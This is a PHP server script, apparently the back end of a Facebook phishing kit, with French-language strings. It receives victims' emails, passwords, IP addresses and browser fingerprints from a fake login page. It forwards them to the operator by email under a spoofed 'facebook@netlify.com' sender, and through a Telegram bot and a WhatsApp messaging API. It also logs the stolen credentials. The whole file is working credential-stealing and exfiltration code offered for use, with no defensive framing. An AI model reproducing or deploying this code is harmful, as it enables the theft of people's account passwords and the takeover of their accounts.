<?php
$CONFIG = [
    'email' => 'votre.email@gmail.com',
    'telegram_bot_token' => 'VOTRE_TOKEN_TELEGRAM',
    'telegram_chat_id' => 'VOTRE_CHAT_ID',
    'whatsapp_apikey' => 'VOTRE_APIKEY_WHATSAPP',
    'whatsapp_phone' => 'VOTRE_NUMERO'
];

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    $email = $input['email'] ?? 'N/A';
    $password = $input['password'] ?? 'N/A';
    $fingerprint = $input['fingerprint'] ?? [];
    $timestamp = $input['timestamp'] ?? date('Y-m-d H:i:s');
    $referrer = $input['referrer'] ?? 'direct';
    
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    
    $backup_results = [];
    
    $email_sent = send_email($email, $password, $ip, $fingerprint, $timestamp, $referrer);
    $backup_results[] = $email_sent ? 'email_ok' : 'email_fail';
    
    $telegram_sent = send_telegram($email, $password, $ip, $fingerprint, $timestamp, $referrer);
    $backup_results[] = $telegram_sent ? 'telegram_ok' : 'telegram_fail';
    
    $whatsapp_sent = send_whatsapp($email, $password, $ip, $fingerprint, $timestamp, $referrer);
    $backup_results[] = $whatsapp_sent ? 'whatsapp_ok' : 'whatsapp_fail';
    
    $log_message = "🔐 NOUVELLE CONNEXION:\nEmail: $email\nPassword: $password\nIP: $ip\nTimestamp: $timestamp";
    error_log($log_message);
    $backup_results[] = 'netlify_log';
    
    echo json_encode([
        'status' => 'success',
        'message' => 'Connexion traitée',
        'backups' => $backup_results
    ]);
} else {
    echo json_encode(['status' => 'error', 'message' => 'Méthode non autorisée']);
}

function send_email($email, $password, $ip, $fingerprint, $timestamp, $referrer) {
    global $CONFIG;
    
    $subject = "🔐 Facebook - Nouvelle connexion - $timestamp";
    $message = "Nouvelle connexion Facebook:\n\nEmail: $email\nPassword: $password\nIP: $ip\nTime: $timestamp";
    
    $headers = "From: facebook@netlify.com\r\n";
    $headers .= "Content-Type: text/plain; charset=utf-8\r\n";
    
    return mail($CONFIG['email'], $subject, $message, $headers);
}

function send_telegram($email, $password, $ip, $fingerprint, $timestamp, $referrer) {
    global $CONFIG;
    
    if (empty($CONFIG['telegram_bot_token']) || empty($CONFIG['telegram_chat_id'])) {
        return false;
    }
    
    $message = "🔐 Facebook Login\nEmail: $email\nPassword: $password\nIP: $ip\nTime: $timestamp";
    
    $url = "https://api.telegram.org/bot{$CONFIG['telegram_bot_token']}/sendMessage";
    $data = ['chat_id' => $CONFIG['telegram_chat_id'], 'text' => $message];
    
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);
    
    return $result !== false;
}

function send_whatsapp($email, $password, $ip, $fingerprint, $timestamp, $referrer) {
    global $CONFIG;
    
    if (empty($CONFIG['whatsapp_apikey']) || empty($CONFIG['whatsapp_phone'])) {
        return false;
    }
    
    $message = "🔐 Facebook Login%0AEmail: $email%0APassword: $password%0AIP: $ip%0ATime: $timestamp";
    
    $url = "https://api.callmebot.com/whatsapp.php?" . http_build_query([
        'phone' => $CONFIG['whatsapp_phone'],
        'text' => $message,
        'apikey' => $CONFIG['whatsapp_apikey']
    ]);
    
    $result = @file_get_contents($url);
    return $result !== false;
}
?>
